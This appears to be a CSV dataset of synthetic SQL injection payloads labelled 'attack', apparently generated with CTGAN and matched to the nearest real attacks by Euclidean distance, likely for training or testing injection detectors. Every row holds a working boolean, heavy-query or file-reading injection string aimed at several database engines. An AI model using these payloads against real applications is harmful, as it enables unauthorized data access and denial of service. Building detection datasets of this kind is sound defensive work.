id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000145,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,7.136808719597013
CTGAN_000146,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000027,5.540709242870518
CTGAN_000147,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",nearest_attack_euclidean,R000239,5.765220031054561
CTGAN_000148,attack,boolean,"1' where 5023  =  5023 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000226,7.577290005514043
CTGAN_000149,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000242,7.804355085250406
CTGAN_000150,attack,boolean,"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",nearest_attack_euclidean,R000121,5.992906117607938
CTGAN_000151,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000245,6.603412411492664
CTGAN_000152,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R000113,6.801119002119659
CTGAN_000153,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R000161,6.285814727545044
CTGAN_000154,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000189,5.54877912906747
CTGAN_000155,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000137,6.3919513310758935
CTGAN_000156,attack,boolean,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000300,8.22459189764902
CTGAN_000157,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000154,6.503582220574793
CTGAN_000158,attack,boolean,"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000062,5.584981232927653
CTGAN_000159,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000269,5.505016148005463
CTGAN_000160,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,7.644595787253553
CTGAN_000161,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000245,7.204870453226682
CTGAN_000162,attack,boolean,"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",nearest_attack_euclidean,R000208,4.642013891157747
CTGAN_000163,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000269,6.281771839743011
CTGAN_000164,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,4.29177823042398
CTGAN_000165,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000137,7.591714830011637
CTGAN_000166,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000024,6.13650590282802
CTGAN_000167,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R000192,5.398351878722489
CTGAN_000168,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000093,5.139356298620313
CTGAN_000169,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000312,5.5282101714486815
CTGAN_000170,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000024,5.034891583399808
CTGAN_000171,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,7.2533052440860954
CTGAN_000172,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000086,4.82670448694331
CTGAN_000173,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R000248,5.916623000106782
CTGAN_000174,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000260,4.33574091596977
CTGAN_000175,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000007,5.384711669372698
CTGAN_000176,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",nearest_attack_euclidean,R000254,4.9141939003313775
CTGAN_000177,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000041,6.1338640330209095
CTGAN_000178,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000242,6.345253225564088
CTGAN_000179,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000189,6.498344952621237
CTGAN_000180,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,7.7335612314394355
CTGAN_000181,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000256,5.463034818928192
CTGAN_000182,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000203,5.448273041121218
CTGAN_000183,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",nearest_attack_euclidean,R000202,6.984716230611012
CTGAN_000184,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000260,4.515111051614671
CTGAN_000185,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000065,6.452214138885973
CTGAN_000186,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,6.626744201829178
CTGAN_000187,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,4.712784590201294
CTGAN_000188,attack,boolean,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",nearest_attack_euclidean,R000271,7.386476366355982
CTGAN_000189,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000287,4.9531141118769035
CTGAN_000190,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R000161,6.197029147254496
CTGAN_000191,attack,boolean,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000073,5.81003930038317
CTGAN_000192,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000183,5.609322887835936
CTGAN_000193,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000233,8.393819387174887
CTGAN_000194,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000031,6.656349096711929
CTGAN_000195,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000006,6.466471657480647
CTGAN_000196,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000184,6.045752138329793
CTGAN_000197,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,7.863624543603164
CTGAN_000198,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000146,6.590317028866676
CTGAN_000199,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,5.14927605643901
CTGAN_000200,attack,boolean,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",nearest_attack_euclidean,R000271,5.551143923698617
CTGAN_000201,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000159,5.896543078927081
CTGAN_000202,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000100,6.687905275840924
CTGAN_000203,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000068,4.051684568571667
CTGAN_000204,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000155,3.7365217618360984
CTGAN_000205,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000127,7.019356871548578
CTGAN_000206,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000189,6.712951601819757
CTGAN_000207,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",nearest_attack_euclidean,R000254,6.608794080831527
CTGAN_000208,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000233,6.786665469003783
CTGAN_000209,attack,boolean,"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000188,6.052748910516388
CTGAN_000210,attack,boolean,1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,nearest_attack_euclidean,R000051,6.2388865014618755
CTGAN_000211,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,6.909782108863283
CTGAN_000212,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000021,6.698690824186351
CTGAN_000213,attack,boolean,"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000241,6.149851717588185
CTGAN_000214,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000231,6.376421706299437
CTGAN_000215,attack,boolean,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,nearest_attack_euclidean,R000019,5.973141166893625
CTGAN_000216,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000154,6.042270212144228
CTGAN_000217,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000227,5.168231814974986
CTGAN_000218,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,6.145418002991807
CTGAN_000219,attack,boolean," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,6.17830264176632
CTGAN_000220,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000076,5.159690355619573
CTGAN_000221,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000268,5.080841352760516
CTGAN_000222,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000215,5.815472019765497
CTGAN_000223,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000308,4.979607992628396
CTGAN_000224,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",nearest_attack_euclidean,R000254,4.942108016401881
CTGAN_000225,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",nearest_attack_euclidean,R000280,4.406003538575599
CTGAN_000226,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000269,4.141458555843787
CTGAN_000227,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000129,4.902758421978617
CTGAN_000228,attack,boolean,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,nearest_attack_euclidean,R000019,9.072534724620128
CTGAN_000229,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000290,7.1155931303972055
CTGAN_000230,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000298,7.720990611490643
CTGAN_000231,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000129,6.836697278564115
CTGAN_000232,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000159,7.836700537186506
CTGAN_000233,attack,boolean,"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,7.2272767126592425
CTGAN_000234,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000225,7.294172892297983
CTGAN_000235,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000303,6.5594573963656515
CTGAN_000236,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000234,6.205215068556552
CTGAN_000237,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000191,5.075363270879457
CTGAN_000238,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000110,4.759323580937265
CTGAN_000239,attack,boolean,"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,nearest_attack_euclidean,R000117,7.467999064815466
CTGAN_000240,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000227,5.868961231176748
CTGAN_000241,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R000113,5.723276777619684
CTGAN_000242,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",nearest_attack_euclidean,R000269,6.841658962106347
CTGAN_000243,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,5.80630368965252
CTGAN_000244,attack,boolean,-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',nearest_attack_euclidean,R000295,6.341693331273384
CTGAN_000245,attack,boolean," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,7.7605782411998625
CTGAN_000246,attack,boolean,"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",nearest_attack_euclidean,R000059,7.052983784494172
CTGAN_000247,attack,boolean,"-3228""  )   or   (  5901  =  1570  )  *1570 and   (  ""egdd""  =  ""egdd",nearest_attack_euclidean,R000228,5.084112606863672
CTGAN_000248,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000065,6.312224794206466
CTGAN_000249,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,5.153038827983688
CTGAN_000250,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'  =  'nkte",nearest_attack_euclidean,R000105,6.112106399333861
CTGAN_000251,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000100,6.712431002851395
CTGAN_000252,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000007,8.63116651004616
CTGAN_000253,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000189,6.515176903414494
CTGAN_000254,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000007,7.582400418863686
CTGAN_000255,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,6.948764489065784
CTGAN_000256,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000177,7.718088361003156
CTGAN_000257,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000187,5.36537929364564
CTGAN_000258,attack,boolean,1   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   4279  =  4279,nearest_attack_euclidean,R000209,5.722454923356619
CTGAN_000259,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000039,8.152973037242562
CTGAN_000260,attack,boolean,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000170,4.922404195500508
CTGAN_000261,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000293,5.970268539494737
CTGAN_000262,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000189,7.60810893850068
CTGAN_000263,attack,boolean,"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",nearest_attack_euclidean,R000157,6.3804716506789125
CTGAN_000264,attack,boolean,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",nearest_attack_euclidean,R000271,5.420735066419861
CTGAN_000265,attack,boolean,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000170,4.397026545254933
CTGAN_000266,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000279,5.5121586700556655
CTGAN_000267,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000203,8.196276851231447
CTGAN_000268,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",nearest_attack_euclidean,R000239,7.628505185051629
CTGAN_000269,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000068,4.805167616439835
CTGAN_000270,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000268,5.802337793405011
CTGAN_000271,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,6.523732190492304
CTGAN_000272,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000027,6.833058540830055
CTGAN_000273,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000242,7.074896073066465
CTGAN_000274,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000014,6.409649640997837
CTGAN_000275,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000154,6.048397275728354
CTGAN_000276,attack,boolean,"1"" where 5440  =  5440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000085,6.817181012239473
CTGAN_000277,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000183,7.027620249947927
CTGAN_000278,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R000102,7.034389014992691
CTGAN_000279,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000127,8.281354765424922
CTGAN_000280,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000218,5.652332238266426
CTGAN_000281,attack,boolean,"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000062,6.723256498790661
CTGAN_000282,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000265,7.385533907993177
CTGAN_000283,attack,boolean,"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",nearest_attack_euclidean,R000131,6.404000616949409
CTGAN_000284,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,5.980312773167477
CTGAN_000285,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000242,5.6935657594298
CTGAN_000286,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,5.793731092772749
CTGAN_000287,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000021,6.29557631945497
CTGAN_000288,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000256,7.522509316329536
CTGAN_000289,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000308,5.553679169292507
